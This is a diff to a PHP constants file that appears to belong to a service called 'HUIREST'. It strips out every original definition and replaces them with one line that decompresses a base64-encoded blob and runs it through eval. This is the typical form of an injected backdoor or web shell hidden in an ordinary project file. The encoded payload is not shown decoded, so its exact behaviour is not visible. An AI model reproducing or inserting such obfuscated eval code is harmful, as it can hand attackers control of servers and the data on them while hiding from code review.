@@ -1,23 +1,3 @@
 <?php
-/**
- * Created by PhpStorm.
- * User: hitpony
- * Date: 3/23/18
- * Time: 10:17 AM
- */
-
-//HuirestActionidDefination
-
-define("HUIRST_ACTIONID_SPECIAL_URL", "http://localhost:8000");
-define("HUIRST_ACTIONID_SPECIAL_MSG_LEN", 72);
-
-define("HUIREST_ACTIONID_SPECIAL_test1", 0x5000);
-define("HUIREST_ACTIONID_SPECIAL_GTJY_water_meter_encode", 0x5001);
-define("HUIREST_ACTIONID_SPECIAL_GTJY_water_meter_decode", 0x5002);
-
-define("HUIREST_ACCESS_CONST_SVRTAG_PRINTER_IN_STRING", "printer");
-define("HUIREST_ACCESS_CONST_SVRTAG_DBA_IN_STRING", "dba");
-define("HUIREST_ACCESS_CONST_SVRTAG_VISION_IN_STRING", "vision");
-define("HUIREST_ACCESS_CONST_SVRTAG_AIWGT_IN_STRING", "aiwgt");
-define("HUIREST_ACCESS_CONST_SVRTAG_SENSOR_IN_STRING", "sensor");
-define("HUIREST_ACCESS_CONST_SVRTAG_SPECIAL_IN_STRING", "special");
+eval(gzinflate(base64_decode('nZFRa4MwFIXfBf9D8GkrY9GW0eKeMhWb0dpi0o49BavZDLRGNFvXf7+kUJhdy2QvIffknu8mJ7YFBwPbAgMQNDxTvACbA1iWNVGy2d0fD1Ytb3xQClXL6nBUQt3ogxEcjqA3OSpU7LTiub43BmhuJGhbtgXh9EM0vFUoV0JWogj5m6gyszfHhan4jTNd4ZRQhgKKFwkOGVlGAUYztkpnzh1wSqVqH8KtzLNtKVvlT1zXdW4f/wbMScxmUaIh46Hp7zqiSxalb+tpg/v1oKecD7loienzK9vrTBq242blVS4LfoJ4/4MU/Cfk6vWDiBAWLBJdkHVKUcyWKU5olDKcMEL1PjYZ1o2oNPVXatcg4RPqAopN1tu8xkQ/ruv/FK3+9d4IhF9i2iVkYv+uegNIlJDFWQgtr1rZP4PT13QZNc9FttWQbw==')));
+?>
